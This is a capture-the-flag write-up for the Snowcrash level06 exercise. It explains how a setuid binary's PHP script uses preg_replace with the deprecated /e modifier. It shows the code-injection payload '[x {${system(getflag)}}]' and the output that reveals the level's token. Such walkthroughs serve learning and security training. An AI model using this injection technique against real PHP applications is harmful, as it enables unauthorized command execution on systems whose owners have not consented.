# <center>Snowcrash level06</center>

# Explanations

<br/>

## On VM:
> $ ls -l
>>-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06<br/>
>>-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php

> $ ./level06
>> PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4

- The binary level06 uses the php script to read the content of a file and filter it with regex.
- The function preg_replace($pattern, $replacement, $string) uses /e which is deprecated. 
- This modifier /e executes $string as a php script after apply pattern. https://wiki.php.net/rfc/remove_preg_replace_eval_modifier
- We will be able to inject commands with the system() function after creating a line that passes the regex. 

> $ echo '[x {${system(getflag)}}]' > /tmp/script <br/>
> $ ./level06 /tmp/script
>>PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1<br/>
>>Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub<br/>
>>PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
